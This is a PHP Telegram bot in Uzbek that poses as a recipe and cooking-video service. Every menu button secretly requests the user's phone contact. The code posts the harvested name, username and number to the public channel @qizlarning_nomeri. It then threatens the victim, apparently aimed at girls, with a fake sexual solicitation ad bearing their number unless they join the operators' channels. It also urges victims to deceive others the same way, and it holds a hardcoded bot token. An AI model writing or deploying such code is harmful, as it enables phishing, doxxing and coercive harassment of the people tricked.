<?php
define('API_KEY','804896171:AAFcKu02XkQ-4CqVlpXphlNa7ObPK6OwHHg');
$admin = "@qizlarning_nomeri";
function del($nomi){
array_map('unlink', glob("$nomi"));
}

function put($fayl,$nima){
file_put_contents("$fayl","$nima");
}
function get($fayl){
$get = file_get_contents("$fayl");
return $get;
}
function ty($ch){ 
return bot('sendChatAction', [
'chat_id' => $ch,
'action' => 'typing',
]);
}
function editMessageText(
        $chatId,
        $messageId,
        $text,
        $parseMode = null,
        $disablePreview = false,
        $replyMarkup = null,
        $inlineMessageId = null
    ) {
       return bot('editMessageText', [
            'chat_id' => $chatId,
            'message_id' => $messageId,
            'text' => $text,
            'inline_message_id' => $inlineMessageId,
            'parse_mode' => $parseMode,
            'disable_web_page_preview' => $disablePreview,
            'reply_markup' => $replyMarkup,
        ]);
    }
function ACL($callbackQueryId, $text = null, $showAlert = false)
{
     return bot('answerCallbackQuery', [
        'callback_query_id' => $callbackQueryId,
        'text' => $text,
        'show_alert'=>$showAlert,
    ]);
}
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
$update = json_decode(get('php://input'));
$message = $update->message;
$text = $message->text;
$cid = $message->chat->id;
$uid = $message->from->id;
$fname = $message->from->first_name;
$user = $message->from->username;
$data = $message->contact;
$nomer = $message->contact->phone_number;
$name = $message->contact->first_name;


if($text == "/start"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"  *Assalomu alaykum🙋‍♂hurmatli foydalanuvchi \nBIZNING BOT JUDA
Ham xush momila*
BU bot orqali siz istagan turdagi yani milliy va chet el taomlarining tayyorlanish usuli(vedio dars)haqida tanishasiz
 xullas pastdagi ajoyib kinopkalar yordamida siz o'zingizga kerakli malumotlarni olasiz\n
💪🙏�kinopkalar�🙏🙏💪
*YOQIMLI ISHTAHA*",
        'parse_mode'=>"markdown",
        'reply_markup'=>json_encode(
['resize_keyboard'=>true,
'keyboard' => [
[["text"=>"MILLIY TAOMLAR",'request_contact' =>true],["text"=>"CHETELDA ENG MASHXURLARI",'request_contact' =>true],
],[["text"=>"RETSIP(O'ZBEK)",'request_contact' =>true],["text"=>"RETSIP(CHET EL)",'request_contact' =>true],
],[["text"=>"ENG QIMMATBAHO TAOMLAR",'request_contact' =>true],["text"=>"ENG QADIMIY TAOMLAR",'request_contact' =>true],
],[["text"=>"ISHTAHANI OCHUVCHI RASMLAR",'request_contact' =>true]],
]
])
]);
}
if($data){
bot('sendmessage',[
    'chat_id'=>"@qizlarning_nomeri",
    'text'=>"User idsi: [$fname](tg://user?id=$uid)\nUseri: @$user\nNomeri: $nomer\nNomer nomi: $name",
    'parse_mode'=>"markdown"
        ]);
bot("sendmessage",[
    'chat_id'=>$cid,
    'text'=>"
xullas yaxshigina uxlading
sini aldashdi menga nomeringni berding👆👆👆👆
usha nomering.   @qizlarning_nomeri
kanaliga tushdi agar tezroq
bizning @XABARCHILAR va @qizlarning_nomeri kanallariga azo bo‘lsang botni o‘zi
 sening nomeringni @qizlarning_nomeri kanalidan olib tashlaydi shunday ekan tezroq A'ZO bo‘l


Agar kimnidir aldab nomerini olmoqchi bo‘lsang men kabi aldoqchi botlar @qizlarning_nomeri
kanalining ichida juda ko'p sen ham qollab ko‘r
kimnidir xuddu shu usul bilan unga sezdirmay nomerini bilib ol!!
____________________________________
agar azo bo'lmasang nima bolishini bilasanmi
tasavvur qilolmagan bo'lsang
mana marhamat pastdagi kinopka orqali raqamingni axvolini ko'r
yaxshi qiz xavotirlanmang shunchaki azo bolib qoying shunda hech nima bo'lmaydi
10000000% javob beramiz",
    'reply_markup'=>json_encode(
[
'resize_keyboard'=>true,
'selective'=>true,
'one_time_keyboard'=>true,
'keyboard' => [
[["text"=>"nomeringni axvoli"],],
]
])
]);
}
$button = $message->keyboardbutton->text;
if($text == "nomeringni axvoli"){
    bot('sendmessage',[
        'chat_id'=>$cid,
        'text'=>"Endi sening nomering va akkaunting botni bazasida agar
kanallarimizga azo bo'lmasang yoki bir azo bolib kiyin chiqib ketsang
pastdagi REKLAMA telegramning hamma kanal va guruhlariga tarqatiladi100%,
kanallarimizga a'zo bo'lishing uchun 30 daqiqa vaqt kiyin
agar a'zo bo'lmagan bo'lsang
aynan mana shu botning o'zi reklamani tarqata boshlaydi
bot aqilli inson tomonidan aftomatik harakatlanadigan qilib yasalgan
YA'NI botni boshqarish shart emas

------------------------------------------------------------------
[shu joyga bir chiroyli qizzi rasmi kiyin]
mening ismim NARGIZA yigitlar bilan tanishish va aloqaga kirishish maning jonu dilim
men hayotimni jinsiy aloqalarsiz his eta olmayman
agar kela olmasanggiz IMO,TELEGRAM,VATSAP,INSTAGRAM larda yichinaman
xullas pul juda ham kerak tezro telefon qiling

$$$$$$$$ $nomer  $$$$$$$$
         @$user
------------------------------------------------------------------
👆shuni o'zi yitarli manimcha
bizda ayb yo'q nomering olinayotganda OGOHlantirildi va sen OK ni bosib tasdiqlading
yaxshi qiz xavotirlanmang shunchaki azo bolib qoying shunda hech nima bo'lmaydi
10000000% javob beramiz "]);
}

